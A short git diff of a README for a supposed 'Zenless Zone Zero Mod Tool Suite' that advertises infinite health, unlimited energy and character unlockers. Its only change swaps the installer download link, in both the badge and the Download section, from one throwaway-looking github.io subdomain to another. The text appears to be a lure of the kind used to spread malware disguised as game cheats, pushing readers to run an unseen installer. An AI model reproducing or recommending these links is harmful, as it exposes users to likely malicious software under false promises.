@@ -2,7 +2,7 @@
 
 Welcome to the Zenless Zone Zero Mod Tool Suite, your all-in-one solution for enhancing gameplay in Zenless Zone Zero. This tool suite provides features like infinite health, unlimited energy, and character unlockers to help you enjoy the game to its fullest. Last updated in 2026 for the latest version of the game.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -65,7 +65,7 @@ A: Yes, we plan to add more features and ensure compatibility with future game u
 
 ## Download
 
-Download the latest version from [GitHub](https://yellowtaxisave.github.io/download-page/).
+Download the latest version from [GitHub](https://capitals-707-bringing.github.io/download-page/).
 
 ## License
 
